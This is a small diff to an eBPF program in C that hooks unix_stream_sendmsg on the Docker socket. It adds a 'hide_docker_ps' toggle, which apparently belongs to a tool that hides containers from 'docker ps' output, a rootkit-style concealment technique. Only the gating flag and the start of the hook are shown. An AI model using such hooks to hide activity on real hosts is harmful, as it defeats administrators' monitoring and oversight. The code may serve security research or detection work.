@@ -78,12 +78,17 @@ Kill container:
 'docker kill crazy_mclean' : POST /v1.47/containers/crazy_mclean/kill
 */
 
+const volatile char hide_docker_ps;
+
 SEC("fentry/unix_stream_sendmsg")
 int BPF_PROG(unix_stream_sendmsg, struct socket *sock, struct msghdr *msg,
 			        size_t len, int ret)
 // int unix_stream_sendmsg(struct pt_regs *ctx)
 {
-   size_t pid_tgid = bpf_get_current_pid_tgid();
+    if (!hide_docker_ps)
+        return 0;
+
+    size_t pid_tgid = bpf_get_current_pid_tgid();
 
     /* exit if socket is not /run/docker.sock */
     if (!is_docker_sock(sock))
